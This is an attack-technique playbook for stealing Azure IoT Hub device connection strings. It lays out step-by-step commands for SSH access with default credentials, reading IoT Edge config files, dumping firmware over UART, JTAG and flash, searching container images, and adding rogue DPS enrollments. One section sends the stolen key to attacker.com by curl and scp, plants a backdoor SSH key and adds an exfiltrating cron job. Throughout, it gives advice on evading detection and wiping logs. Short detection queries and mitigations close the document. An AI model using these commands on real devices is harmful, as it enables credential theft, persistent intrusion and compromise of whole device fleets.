# CA-UNSC-017: IoT device connection strings theft

## 1. Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-017 |
| **MITRE ATT&CK v18.1** | [T1552.001 - Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID / Azure IoT Hub / IoT Devices |
| **Severity** | Critical |
| **CVE** | CVE-2019-5160 (WAGO IoT Hub redirection), CVE-2019-5134/5135 (WAGO credential exposure) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | All Azure IoT Hub versions; IoT Edge 1.0+; IoT devices with firmware-embedded credentials |
| **Patched In** | No universal fix; requires manufacturer implementation of secure credential storage |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 6 (Atomic Red Team), 11 (Sysmon Detection), and 8 (Splunk Detection) not included because (1) T1552.001 firmware testing is hardware-specific, (2) Sysmon does not capture firmware execution, (3) Splunk is cloud-centric; this technique operates at device level. Remaining sections have been dynamically renumbered.

---

## 2. Executive Summary

**Concept:** Azure IoT devices authenticate to IoT Hub using connection strings—symmetric keys that grant full device-level access. Unlike cloud-based secrets that can be rotated quickly, IoT device credentials are often embedded in firmware or stored in plaintext configuration files on resource-constrained devices. An attacker who gains physical or network access to an IoT device can extract the connection string through multiple vectors: UART/JTAG serial interfaces, SSH access to configuration files, firmware reverse engineering, or memory dumps. A single compromised connection string grants the attacker the ability to send/receive messages as that device, modify device twins, invoke direct methods, and potentially pivot to other systems. If the extracted credential is a service-level key (rather than device-specific), the attacker gains access to all devices in the IoT Hub—enabling supply chain attacks by poisoning firmware updates or hijacking device management.

**Attack Surface:** 
- Device firmware image (binary or cleartext embedded credentials)
- IoT Edge device configuration files (`/etc/aziot/config.toml`)
- Application code or SDKs with hardcoded connection strings
- Environment variables during device provisioning or Docker runtime
- Device memory (accessible via GDB, kernel exploit, or physical memory access)
- Build artifacts or container image layers containing connection strings
- Source code repositories with leaked firmware or configuration
- Device Provisioning Service (DPS) enrollment records if admin key compromised
- Entra ID managed identity metadata endpoint (if device has access)

**Business Impact:** **Complete IoT infrastructure compromise and supply chain attack vector.** An attacker who extracts connection strings from a firmware image can compromise thousands of deployed devices simultaneously. By modifying cloud-to-device messages, the attacker can execute arbitrary commands, brick devices, or exfiltrate sensor data. If the IoT device has network access to on-premises systems (e.g., industrial control systems, medical devices), the compromise extends to critical infrastructure. Historical precedent: the Mirai botnet exploited default credentials on 820,000 devices; modern firmware-based attacks could affect millions.

**Technical Context:** IoT devices have severe resource constraints—limited CPU, RAM, and storage. Manufacturers often opt for symmetric keys (connection strings) over X.509 certificates due to lower computational overhead. Security best practices recommend regular credential rotation, but most IoT devices lack over-the-air update capabilities, forcing credentials to have multi-year lifespans. A compromised credential discovered today may remain valid for years if the device is not updated.

### Operational Risk
- **Execution Risk:** Low for firmware extraction (requires physical access or already-compromised device); Medium for configuration file access (requires network access or shell)
- **Stealth:** High - Device compromise may not generate alerts if telemetry streams are not monitored for anomalies
- **Reversibility:** No - Extracted connection strings are typically valid until explicitly revoked; revocation requires updating all affected devices

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1.1, 4.2.1 | Weak credential storage, firmware hardening |
| **DISA STIG** | CAT I - Removable Media | Insecure storage of device identity credentials |
| **CISA SCuBA** | ICS-1.1 | Secure Device Identity and Authentication |
| **NIST 800-53** | IA-2 (Authentication), SC-7 (Boundary Protection), SC-13 (Cryptographic Protection) | Implement multi-factor authentication, encrypt credentials in transit/at rest |
| **GDPR** | Art. 32 (Security of Processing), Art. 33 (Breach Notification) | Failure to encrypt credentials; mandatory breach reporting if connection string exposed |
| **DORA** | Art. 9 (Protection and Prevention), Art. 19 (Cryptographic Keys Management) | IoT devices as critical ICT infrastructure require robust credential management |
| **NIS2** | Art. 21.1 (Risk Management), Art. 21.2 (Supply Chain Security) | Supply chain attacks via compromised IoT firmware; incident response procedures required |
| **ISO 27001** | A.8.2.1 (User Registration), A.9.1.1 (Access Control Policy), A.10.1.1 (Cryptography) | Management of device credentials; encryption of sensitive data at rest/in transit |
| **ISO 27005** | 7.4.2 (Supply Chain Attack Risk) | Firmware tampering and credential exposure in manufacturing/deployment supply chain |

---

## 3. Technical Prerequisites

**Required Privileges:**
- For firmware extraction: Physical access to device UART/JTAG pins, OR root/privileged access to device shell
- For configuration file access: SSH/shell access with privileges to read `/etc/aziot/config.toml`
- For container image analysis: Access to container registry or local Docker daemon
- For DPS enrollment compromise: Service principal or SAS token with Device Provisioning Service write permissions

**Required Access:**
- Physical: USB port, UART serial interface, or JTAG debugger access to device
- Network: SSH, Telnet, or HTTP management interface to device (if unpatched)
- Cloud: Access to container registry (DockerHub, ACR), build artifact storage, or source code repository
- Optional: Managed identity metadata endpoint access (if device runs in Azure environment with MI enabled)

**Supported Versions:**
- **Azure IoT Hub:** All versions (Standard and Basic tiers)
- **IoT Edge:** 1.0+ (all versions)
- **Device OS:** Linux (Ubuntu, Debian, Raspbian), Windows IoT, proprietary embedded OS
- **Authentication Methods Vulnerable:** Symmetric keys (connection strings), X.509 with hardcoded private keys

**Tools:**
- [Binwalk](https://github.com/ReFirmLabs/binwalk) - Firmware extraction and analysis
- [Ghidra](https://github.com/NationalSecurityAgency/ghidra) - Reverse engineering binaries
- [UART serial console tools](https://en.wikipedia.org/wiki/Serial_port) - `minicom`, `screen`, `PuTTY`
- [GDB](https://www.gnu.org/software/gdb/) - Memory dump and live debugging
- [Docker](https://www.docker.com/) - Container image extraction and layer analysis
- [AADInternals PowerShell Module](https://github.com/Gerenios/AADInternals) - Managed identity token theft
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) - IoT Hub management and device listing

---

## 4. Detailed Execution Methods

### METHOD 1: Extract Connection String from IoT Edge Device Configuration File

**Supported Versions:** IoT Edge 1.0+ on Linux (Ubuntu, Debian, CentOS)

#### Step 1: Gain SSH Access to IoT Edge Device

**Objective:** Obtain shell access to the device running Azure IoT Edge runtime.

**Preconditions:** 
- Device is connected to network
- SSH service is enabled (port 22 or custom port)
- Attacker has valid credentials OR SSH key, OR device has known default credentials

**Command:**

```bash
# Attempt SSH connection with default or compromised credentials
ssh -i device_private_key.pem azureuser@<device_ip>
# OR
ssh admin@<device_ip>  # (with password)
# OR exploit default credentials (e.g., raspberry/raspberry on Raspberry Pi)
ssh pi@<device_ip>
```

**Expected Output:**

```
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
azureuser@edge-device:~$
```

**What This Means:**
- You have shell access to the device
- You can now read configuration files
- Device credentials are accessible

**OpSec & Evasion:**
- Detection likelihood: **Low-Medium** - SSH login is logged in `/var/log/auth.log`, but logs are often not monitored in real-time
- Evasion: Use non-standard SSH port; connect during high-activity periods; clear `~/.bash_history` after exiting
- Timing: Compromise device during maintenance window when management access is expected

**Troubleshooting:**

- **Error:** "Connection refused" on port 22
  - **Cause:** SSH not enabled or firewall blocking
  - **Fix:** Enable SSH on device via physical console or management interface
  - **Alternative:** Use console/serial access (see Method 2)

- **Error:** "Permission denied (publickey,password)"
  - **Cause:** Credentials incorrect or key not accepted
  - **Fix:** Attempt default credentials for device type (e.g., `pi:raspberry` for Raspberry Pi)
  - **Alternative:** Exploit known vulnerability in management interface (CVE-specific)

**References:**
- [Microsoft Learn: IoT Edge device access](https://learn.microsoft.com/en-us/azure/iot-edge/configure-device)
- [Quarkslab: IoT Attack Scenarios](https://www.quarkslab.com/iot-attack-scenarios/)

---

#### Step 2: Locate and Read IoT Edge Configuration File

**Objective:** Extract the device connection string from the IoT Edge runtime configuration.

**Command:**

```bash
# Primary IoT Edge configuration file (requires root or sudo)
sudo cat /etc/aziot/config.toml
# OR
sudo cat /etc/iotedge/config.yaml  # (older IoT Edge versions)

# Look for connection_string line:
# connection_string = "HostName=...;SharedAccessKeyName=owner;SharedAccessKey=..."
```

**Expected Output:**

```toml
# /etc/aziot/config.toml
[provisioning]
source = "manual"
connection_string = "HostName=my-hub.azure-devices.net;SharedAccessKeyName=owner;SharedAccessKey=aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890abc="

[agent]
name = "edgeAgent"
type = "docker"
image = "mcr.microsoft.com/azureiotedge-agent:1.4"
createOptions = "{\"Env\":[]}"

[edge_hub]
name = "edgeHub"
type = "docker"
image = "mcr.microsoft.com/azureiotedge-hub:1.4"
```

**What This Means:**
- `connection_string` field contains the IoT Hub device credentials
- `SharedAccessKeyName=owner` indicates this is the device's primary key (full access)
- The Base64-encoded `SharedAccessKey` value is the actual symmetric credential
- This key authenticates the device to the IoT Hub

**OpSec & Evasion:**
- Detection likelihood: **Low** - Reading configuration files is normal administrative activity
- Alternative: Use `grep` to extract only the connection string line without reading entire config
- Hiding: Don't output directly to terminal; redirect to file in `/tmp` which is often less monitored

**Troubleshooting:**

- **Error:** "Permission denied"
  - **Cause:** Need sudo to read `/etc/aziot/`
  - **Fix:** Use `sudo` to elevate privileges
  - **Alternative:** If sudo not available, look for backup configs in user home directories or `/var/lib/` paths

- **Error:** File not found at `/etc/aziot/config.toml`
  - **Cause:** Older IoT Edge version (pre-1.2)
  - **Fix:** Try `/etc/iotedge/config.yaml` instead
  - **Fix:** Check IoT Edge version: `iotedge --version`

**References:**
- [Microsoft Learn: IoT Edge configuration file](https://learn.microsoft.com/en-us/azure/iot-edge/configure-device)
- [Microsoft Docs: Updating iotedge config](https://learn.microsoft.com/en-us/azure/iot-edge/configure-device#update-the-edge-device-configuration)

---

#### Step 3: Exfiltrate Connection String and Establish Persistence

**Objective:** Extract the connection string from the device and establish a secondary access method.

**Command:**

```bash
# Extract connection string to attacker's server
CONNECTION_STRING=$(sudo grep "connection_string" /etc/aziot/config.toml | awk -F'"' '{print $2}')
echo $CONNECTION_STRING | curl -d @- http://attacker.com/exfil

# Alternative: Write to file and exfiltrate via SCP
echo $CONNECTION_STRING > /tmp/iot_key.txt
scp /tmp/iot_key.txt attacker@attacker.com:/tmp/

# Establish persistence: Add backdoor SSH key to authorized_keys
mkdir -p ~/.ssh
echo "ssh-rsa AAAA...attacker_public_key... attacker@C2" >> ~/.ssh/authorized_keys

# Or: Create cron job that periodically sends connection string
(crontab -l 2>/dev/null; echo "*/30 * * * * echo \$CONNECTION_STRING | curl -d @- http://attacker.com/ping") | crontab -
```

**What This Means:**
- Attacker now has the connection string persisted on their infrastructure
- Device access is persistent even if original compromise vector is patched
- Attacker can now impersonate this IoT device to IoT Hub indefinitely

**OpSec & Evasion:**
- Detection likelihood: **Medium-High** - Cron job additions and SSH key modifications may be detected by integrity monitoring
- Evasion: Add SSH key to a less-monitored user account; use systemd timer instead of cron; hide files with leading dot (`.ssh/authorized_keys`)
- Cleanup: Remove from `.bash_history` via `history -c` and truncate log files

**References:**
- [Linux Persistence: SSH Keys](https://attack.mitre.org/techniques/T1098/001/)
- [MITRE ATT&CK: Cron Job Abuse](https://attack.mitre.org/techniques/T1053/006/)

---

### METHOD 2: Extract Connection String via Firmware Reverse Engineering

**Supported Versions:** All IoT devices with firmware-embedded credentials

#### Step 1: Obtain Device Firmware Image

**Objective:** Extract the complete firmware binary from the IoT device.

**Preconditions:**
- Physical access to device (UART, JTAG, or flash chip)
- OR firmware image publicly available from manufacturer's support site
- OR firmware leaked in source code repository

**Physical Extraction Methods:**

**Option A: UART Serial Console**

```bash
# Using a UART USB adapter (e.g., CH340, FTDI):
# 1. Connect USB adapter to UART pins on device:
#    GND (Black)   → GND
#    RX (Green)    → TX (Device)
#    TX (White)    → RX (Device)
#    5V (Red)      → Optional (for power, if needed)

# 2. Open serial console on Linux/Mac:
minicom -D /dev/ttyUSB0 -b 115200
# OR
screen /dev/ttyUSB0 115200

# 3. During device boot, you'll see bootloader output and may be able to:
#    - Access bootloader shell (if not password-protected)
#    - Read firmware from flash via bootloader commands
#    - Extract memory contents line-by-line via serial

# 4. If bootloader accessible, commands like:
#    > dump 0x10000 0x100000 /tmp/firmware.bin  # (varies by bootloader)
#    > save /tmp/firmware.bin  # to extract

# 5. Alternatively, use UART for shell access (same as SSH, but slower)
#    User prompts may expose plaintext credentials
```

**Option B: JTAG/SWD Debugging Interface**

```bash
# Using JTAG debugger (e.g., ST-LINK, J-LINK):
# 1. Identify JTAG pins on device PCB (typically 4-20 pins)
# 2. Connect debugger via SWD/JTAG adapter
# 3. Use OpenOCD (Open On-Chip Debugger):

openocd -f interface/stlink.cfg -f target/stm32f1x.cfg
# In OpenOCD telnet session (port 4444):
# > init
# > dump_image /tmp/firmware.bin 0x08000000 0x80000  # STM32F1 example
# > exit

# 4. Or use GDB directly:
arm-none-eabi-gdb
(gdb) target extended-remote localhost:4242
(gdb) dump memory firmware.bin 0x08000000 0x0807ffff
```

**Option C: NAND/NOR Flash Chip Direct Access**

```bash
# For devices with removable or externally-accessible flash:
# 1. Physically remove flash chip from device (requires microsoldering/desoldering)
# 2. Use flash programmer (e.g., CH341A):
sudo ch341erase /dev/spidev0.0
sudo ch341read -d /dev/spidev0.0 -o firmware.bin

# 3. Reassemble device
```

**Download from Manufacturer:**

```bash
# Many manufacturers publish firmware on public sites:
wget https://manufacturer.com/downloads/device_model_v1.2.3.bin

# Or extract from mobile app APK:
unzip device-app.apk
# Look for firmware blobs in assets/ or lib/ directories
file assets/*  # identify binary files
```

**Expected Output:**

```
$ ls -lh firmware.bin
-rw-r--r-- 1 user group 8388608 Jan 6 10:00 firmware.bin

$ file firmware.bin
firmware.bin: firmware image, Header size: 0, 
              Version: (something), 
              Timestamp: Mon Jan 01 00:00:00 2024
```

**What This Means:**
- You now have the complete firmware binary
- Firmware can be analyzed offline using reverse engineering tools

**OpSec & Evasion:**
- Detection likelihood: **Low for download** (if from public source); **High for physical extraction** (requires opening device, may trigger tamper detection)
- Stealth: If device has tamper detection, quickly reassemble after extraction
- Cover: Claim device needs repairs/upgrade justification

---

#### Step 2: Extract Credentials from Firmware Using Binwalk

**Objective:** Identify and extract the connection string embedded in the firmware binary.

**Command:**

```bash
# Install Binwalk
pip install binwalk

# Analyze firmware structure
binwalk firmware.bin

# Output shows file types and offsets:
# 0             0x0             ELF 32-bit LSB executable, ARM, version 1
# 65536         0x10000         uImage, Linux Kernel Image, ...
# 1048576      0x100000         Squashfs filesystem, ...

# Extract filesystem
binwalk -e firmware.bin

# This extracts to: _firmware.bin.extracted/
# Navigate to extracted squashfs:
cd _firmware.bin.extracted/squashfs-root/

# Search for connection string patterns
grep -r "HostName=" . 2>/dev/null
grep -r "SharedAccessKey" . 2>/dev/null
grep -r "azure-devices" . 2>/dev/null
grep -r "connection_string" . 2>/dev/null

# Look in config files:
cat etc/config/iotedge_config.conf  # if present
cat etc/iotedge/config.yaml
cat var/lib/iotedge/device_connection_string
cat etc/environment | grep AZURE
```

**Expected Output:**

```
./etc/iotedge/config.yaml:
provisioning:
  source: "manual"
  device_connection_string: "HostName=device-hub.azure-devices.net;SharedAccessKeyName=owner;SharedAccessKey=A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8="

./etc/appconfig/app.conf:
IOT_DEVICE_CONNECTION_STRING="HostName=device-hub.azure-devices.net;SharedAccessKeyName=owner;SharedAccessKey=A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8="

./usr/local/bin/iotedge.sh:
export DEVICE_CONNECTION_STRING="HostName=device-hub.azure-devices.net;SharedAccessKeyName=owner;SharedAccessKey=A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8="
```

**What This Means:**
- Connection string found in plaintext in firmware
- Same credential may be used in hundreds or thousands of deployed devices (if firmware is mass-produced)
- Compromising firmware = compromising entire device fleet

**OpSec & Evasion:**
- Detection likelihood: **Low** - Reverse engineering done offline on attacker machine, not on device
- Alternative: Use IDA Pro or Ghidra for more surgical extraction if grep doesn't find plaintext strings (e.g., if credentials are obfuscated)

**Troubleshooting:**

- **Error:** "grep returns no results"
  - **Cause:** Credentials may be obfuscated, encrypted, or binary-encoded
  - **Fix:** Use Ghidra to reverse engineer binary code and find decryption/deobfuscation routines
  - **Fix:** Use entropy analysis to find high-entropy blobs (encrypted data)

- **Error:** "Binwalk extraction fails"
  - **Cause:** Firmware format not recognized or encrypted
  - **Fix:** Use `file` command to identify format
  - **Fix:** Check manufacturer's firmware format documentation
  - **Fix:** Try alternative tools: `unsquashfs`, `dd`, or `hexdump`

**References:**
- [Binwalk GitHub](https://github.com/ReFirmLabs/binwalk)
- [Quarkslab: Firmware Extraction](https://www.quarkslab.com/iot-attack-scenarios/)
- [Microsoft Firmware Analysis](https://learn.microsoft.com/en-us/azure/firmware-analysis/overview-firmware-analysis)

---

### METHOD 3: Extract Connection String from Docker Container Image Layers

**Supported Versions:** Azure IoT Edge modules using Docker containers; any containerized IoT application

#### Step 1: Access Container Registry and List Available Images

**Objective:** Identify and download IoT-related container images from registry.

**Preconditions:**
- Access to container registry (DockerHub, Azure Container Registry, or private registry)
- Credentials for private registries, OR public images without authentication

**Command:**

```bash
# List images in Azure Container Registry (if publicly accessible)
az acr repository list --name mycontainerregistry --output table

# Or query public DockerHub registry:
curl https://registry.hub.docker.com/v2/repositories/library/

# Download container image (requires `docker` or `podman`)
docker pull myregistry.azurecr.io/iotedge-sensor:1.0
docker pull namespace/iotapp:latest

# If credentials needed:
docker login myregistry.azurecr.io -u <username> -p <password>
docker pull myregistry.azurecr.io/iotedge-sensor:1.0
```

**Expected Output:**

```
Pulling from myregistry.azurecr.io/iotedge-sensor
sha256:abc123... Pulling fs layer
sha256:def456... Pulling fs layer
sha256:ghi789... Downloading [===========>  ] 50 MB / 100 MB
Digest: sha256:xyz789...
Status: Downloaded newer image for myregistry.azurecr.io/iotedge-sensor:1.0
```

**What This Means:**
- Image successfully downloaded to local Docker daemon
- You now have access to all layers of the image

---

#### Step 2: Extract and Analyze Container Layers

**Objective:** Extract filesystem from container image layers and search for credentials.

**Command:**

```bash
# Option 1: Use Dive tool (interactive layer inspector)
dive myregistry.azurecr.io/iotedge-sensor:1.0
# Interactive: Navigate to /etc/config, /var/lib/, etc. to find credentials

# Option 2: Manual extraction using Docker
# First, create a temporary container from the image:
docker create --name temp-container myregistry.azurecr.io/iotedge-sensor:1.0

# Export container filesystem:
docker export temp-container -o container.tar
tar -xf container.tar

# Now search extracted filesystem:
grep -r "HostName=" . 2>/dev/null
grep -r "SharedAccessKey" . 2>/dev/null
grep -r "CONNECTION" . 2>/dev/null
find . -name "*config*" -type f -exec grep -l "iot" {} \;

# Check environment in Dockerfile:
grep -r "ENV.*CONNECTION\|ENV.*KEY" .
```

**Alternative: Examine Image Manifest**

```bash
# Get image config details:
docker inspect myregistry.azurecr.io/iotedge-sensor:1.0 --format='{{json .Config.Env}}'

# Output shows environment variables at runtime:
# ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
#  "DEVICE_CONNECTION_STRING=HostName=...;SharedAccessKey=...",
#  "LOG_LEVEL=INFO"]
```

**Expected Output:**

```
container/
├── etc/
│   └── iotedge/
│       └── config.yaml: "HostName=device-hub.azure-devices.net;SharedAccessKey=A1B2C3..."
├── var/
│   └── lib/
│       └── iot/
│           └── device_keys.json: {"connection_string": "HostName=...;SharedAccessKey=..."}
└── app/
    └── appsettings.json: "ConnectionString": "HostName=...;SharedAccessKey=..."
```

**What This Means:**
- Container image contains hardcoded connection string
- Image may be deployed to thousands of IoT Edge devices if it's an organization's standard image
- Compromising the image = compromising all deployments

**OpSec & Evasion:**
- Detection likelihood: **Low** - Downloading container images is normal development activity
- Evasion: Download during normal business hours when image pulls are expected
- Timing: No real-time detection; analysis is offline

---

### METHOD 4: Exploit Device Provisioning Service (DPS) to Compromise Multiple Devices

**Supported Versions:** Azure IoT Hub with DPS enabled; all device authentication methods

#### Step 1: Obtain DPS Service Principal Credentials

**Objective:** Extract credentials for the DPS service connection (e.g., from pipeline, or stolen from admin).

**Preconditions:**
- Access to pipeline variables, Azure Key Vault, or compromised admin account
- Credentials are in format: Service Principal ID + Secret/Certificate

**Command:**

```bash
# If you've already compromised a pipeline/DevOps account (see CA-UNSC-015):
export DPS_SERVICE_PRINCIPAL="client_id:secret"
export DPS_ID_SCOPE="0ne12345678"  # 9-digit scope from DPS instance

# Or authenticate via Entra ID:
az login --service-principal \
  -u <client_id> \
  -p <client_secret> \
  --tenant <tenant_id>

# Set DPS context:
az account set --subscription <subscription_id>
```

**Expected Output:**

```
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "87654321-...",
    "id": "12345678-...",
    "isDefault": true,
    "name": "Production Subscription",
    "state": "Enabled",
    "tenantId": "87654321-...",
    "user": {
      "name": "service-principal@company.onmicrosoft.com",
      "type": "servicePrincipal"
    }
  }
]
```

---

#### Step 2: Enumerate Enrolled Devices in DPS

**Objective:** List all devices enrolled in the DPS instance (potential targets).

**Command:**

```bash
# List all device registrations in DPS:
az iot dps registration list \
  --dps-name <dps-name> \
  --resource-group <rg-name>

# Output: List of device IDs, enrollment status, etc.
# Example:
# [
#   {
#     "deviceId": "sensor-001",
#     "status": "enabled",
#     "createdDateTime": "2024-01-01T00:00:00Z"
#   },
#   {
#     "deviceId": "sensor-002",
#     "status": "enabled",
#     "createdDateTime": "2024-01-02T00:00:00Z"
#   },
#   ...
# ]

# Get enrollment details for specific device:
az iot dps enrollment show \
  --enrollment-id sensor-001 \
  --dps-name <dps-name> \
  --resource-group <rg-name>

# Shows: Attestation type (X.509, TPM, Symmetric Key), certificates/keys, etc.
```

---

#### Step 3: Add Malicious Device to DPS Enrollment or Modify Existing Device

**Objective:** Register a malicious device (or modify an existing registration) to gain IoT Hub access for all devices.

**Command:**

```bash
# If DPS uses Symmetric Key attestation, extract the master key:
# (Available in DPS enrollment if you have admin access)

# Add new device enrollment with attacker-controlled credentials:
az iot dps enrollment create \
  --enrollment-id attacker-device-001 \
  --attestation-type symmetricKey \
  --dps-name <dps-name> \
  --resource-group <rg-name> \
  --device-type Iot \
  --provisioning-status enabled

# The device now has the same IoT Hub ID scope as all legitimate devices
# When attacker's device connects with attacker-generated symmetric key,
# DPS will provision it to the IoT Hub

# Alternatively, if you've extracted a legitimate device's symmetric key,
# you can create a duplicate enrollment:
az iot dps enrollment create \
  --enrollment-id sensor-001-duplicate \
  --attestation-type symmetricKey \
  --iot-hub-host-name <hub-name>.azure-devices.net \
  --auth-type key \
  --primary-key <extracted_primary_key> \
  --dps-name <dps-name> \
  --resource-group <rg-name>

# Now both legitimate device AND attacker device share same credentials
# Both can connect to IoT Hub simultaneously
```

**What This Means:**
- Attacker's device is now registered in DPS
- When it provisions, it receives access to the IoT Hub
- Attacker can send/receive messages, modify device twins, invoke direct methods
- Legitimate devices may not detect duplicate enrollment

**OpSec & Evasion:**
- Detection likelihood: **Medium-High** - New device enrollments may be audited
- Evasion: Register device with legitimate-sounding name (e.g., `sensor-backup-001`, `maintenance-device`)
- Timing: Register during maintenance windows or bulk device onboarding events

**References:**
- [Microsoft Learn: DPS Device Enrollment](https://learn.microsoft.com/en-us/azure/iot-dps/concepts-service)
- [Azure CLI: IoT DPS Commands](https://learn.microsoft.com/en-us/cli/azure/iot/dps)

---

## 5. Tools & Commands Reference

### [Azure CLI IoT Extension](https://learn.microsoft.com/en-us/cli/azure/iot)

**Installation:**

```bash
az extension add --name azure-iot
```

**Key Commands:**

| Command | Purpose |
|---------|---------|
| `az iot dps device-registration list` | List all device registrations in DPS |
| `az iot dps enrollment show` | View specific device enrollment details |
| `az iot dps enrollment create` | Register new device in DPS |
| `az iot hub device-identity create` | Create device identity in IoT Hub |
| `az iot hub device-identity show-connection-string` | Extract device connection string |
| `az iot hub invoke-module-method` | Invoke direct method on device/module |
| `az iot hub device-twin show` | View device twin (desired + reported properties) |
| `az iot hub device-twin update` | Modify device twin |

---

### [Binwalk - Firmware Analysis](https://github.com/ReFirmLabs/binwalk)

**Installation:**

```bash
pip install binwalk
# With extraction support:
pip install binwalk[full]
```

**Common Usage:**

```bash
# Analyze firmware:
binwalk firmware.bin

# Extract with auto-detection:
binwalk -e firmware.bin

# Search for specific strings:
binwalk -s "HostName=" firmware.bin

# Use entropy analysis:
binwalk -E firmware.bin  # Visualize entropy (encrypted regions appear as noise)
```

---

### [Ghidra - Reverse Engineering](https://github.com/NationalSecurityAgency/ghidra)

**For extracting hardcoded credentials from binary code:**

```bash
# Download and extract Ghidra from:
# https://github.com/NationalSecurityAgency/ghidra/releases

# Launch Ghidra GUI:
./ghidra/bin/ghidraRun

# In Ghidra:
# 1. File → Import File → Select firmware.bin
# 2. Double-click to analyze
# 3. Search → Memory → Find strings containing "HostName"
# 4. Right-click → Disassemble to see how string is used
# 5. Trace back to functions that initialize or transmit this string
```

---

### [Dive - Docker Image Inspection](https://github.com/wagoodman/dive)

**For analyzing container image layers:**

```bash
# Installation:
# - Linux: https://github.com/wagoodman/dive/releases
# - macOS: brew install dive
# - Or use Docker:
docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock wagoodman/dive:latest myimage:latest

# Usage (interactive):
# - Arrow keys: Navigate filesystem
# - Tab: Switch between "Layers" view and "Filesystem" view
# - Type to filter files
# - Escape: Exit
```

---

## 6. Microsoft Sentinel Detection

### Query 1: Detect Unauthorized Access to IoT Hub Devices

**Rule Configuration:**
- **Required Table:** AuditLogs, CustomLogs (if IoT Hub logs forwarded)
- **Required Fields:** OperationName, TargetResources, InitiatedBy
- **Alert Severity:** High
- **Frequency:** Every 15 minutes

**KQL Query:**

```kusto
let SuspiciousOperations = dynamic([
    "Create device identity",
    "Update device identity",
    "Invoke direct method",
    "Send cloud-to-device message",
    "Get device twin"
]);

AuditLogs
| where OperationName in (SuspiciousOperations)
    or ActivityDetails contains "deviceId"
    or ActivityDetails contains "connection"
| where InitiatedBy !contains "@company.onmicrosoft.com"  // Exclude known service accounts
    or IpAddress !startswith "10."  // Flag if from non-corporate IP
| where TimeGenerated > ago(15m)
| summarize DeviceAccesses = count() by InitiatedBy, OperationName, IpAddress, bin(TimeGenerated, 5m)
| where DeviceAccesses > 5  // Threshold: more than 5 operations in 5 minutes = suspicious
| project TimeGenerated, InitiatedBy, OperationName, DeviceAccesses, IpAddress
```

**What This Detects:**
- Bulk device creation or modification
- Unauthorized direct method invocation
- Anomalous cloud-to-device messaging
- Access from unexpected IP addresses

---

### Query 2: Detect Container Image with Embedded Credentials

**Rule Configuration:**
- **Required Table:** ContainerImageInventory or AuditLogs (if build process logged)
- **Alert Severity:** Critical

**KQL Query:**

```kusto
// Search build logs or image metadata for credential patterns
AuditLogs
| where ActivityDetails contains "push" or ActivityDetails contains "build"
    and (ActivityDetails contains "HostName=" 
      or ActivityDetails contains "SharedAccessKey"
      or ActivityDetails contains "connection_string")
| project TimeGenerated, InitiatedBy, ActivityDetails, IpAddress

// Alternative: Search container image registries
// ContainerImageInventory
// | where ImageProperties contains regex @"HostName.*SharedAccessKey"
```

---

## 7. Windows Event Log Monitoring

**Event ID: 4697 (Firewall Rule Addition) - if IoT device connects via corporate network**
- **Log Source:** Security (if device logs to central SIEM)
- **Trigger:** Detection of unusual network connections from IoT device
- **Applies To Versions:** IoT Edge on Windows; industrial IoT devices with Windows kernel

**Event ID: 4720 (User Account Created) - if device provisioning service creates accounts**
- **Log Source:** Security
- **Trigger:** Unexpected account creation for IoT management

**Manual Configuration Steps:**

1. On IoT Edge device running Windows, enable audit logging:
   ```powershell
   auditpol /set /subcategory:"Audit Account Management" /success:enable /failure:enable
   auditpol /set /subcategory:"Audit Authentication" /success:enable /failure:enable
   ```

2. Forward logs to central SIEM:
   ```powershell
   # Configure Windows Event Log forwarding to Sentinel or Splunk
   # (Device-specific configuration; see device's documentation)
   ```

---

## 8. Defensive Mitigations

### Priority 1: CRITICAL

* **Implement Hardware Security Module (HSM) for Device Credentials:**
  
  **Applies To Versions:** All IoT device types that support TPM/HSM
  
  **Manual Steps (Device Manufacturer):**
  - Select device hardware with built-in TPM 2.0 or discrete HSM
  - During manufacturing, provision asymmetric keys into HSM (not symmetric keys in flash)
  - Devices authenticate using private key stored in HSM (never exported from hardware)
  - No plaintext connection string ever stored on device
  
  **Example Device Types:**
  - Raspberry Pi 4 with TPM 2.0 module
  - Industrial gateways with discrete HSM
  - Azure IoT MXChip development board (has TPM)
  
  **Validation:**
  ```bash
  # Verify device uses certificate-based auth:
  grep -i "certificate\|x509" /etc/aziot/config.toml
  # Should show cert path, NOT connection_string
  ```

* **Enforce TLS 1.2+ and Mutual TLS Authentication:**
  
  **Manual Steps:**
  1. Ensure IoT Hub requires TLS 1.2+:
     ```bash
     az iot hub update --name <hub-name> --minimum-tls-version 1.2
     ```
  2. Configure device to use mutual TLS:
     ```yaml
     # /etc/aziot/config.toml
     [connection]
     type = "amqps"  # NOT "amqps_ws"
     
     # Ensure root CA cert is valid and up-to-date
     [cert_issuers.root_ca]
     cert = "file:///etc/ssl/certs/ca-certificates.crt"
     ```
  3. Devices must present valid X.509 certificate to IoT Hub
  4. IoT Hub validates device certificate before allowing connection

* **Disable Plaintext Connection String Storage:**
  
  **Manual Steps (Manufacturers):**
  - Remove any code that stores connection string in plaintext files
  - Remove hardcoded connection strings from firmware
  - If symmetric key must be used (legacy), encrypt key in HSM or secure enclave
  - Implement obfuscation/XOR encoding at minimum (but not sufficient as sole protection)
  
  **Validation (Security Audit):**
  ```bash
  # Scan firmware for plaintext patterns:
  strings firmware.bin | grep -i "HostName\|SharedAccessKey\|connection"
  # Should return NO results
  
  # Scan source code repositories:
  git log --all -S "HostName=" -- .  # Find commits that added this pattern
  git log --all -S "SharedAccessKey=" -- .
  # Remove credentials immediately
  ```

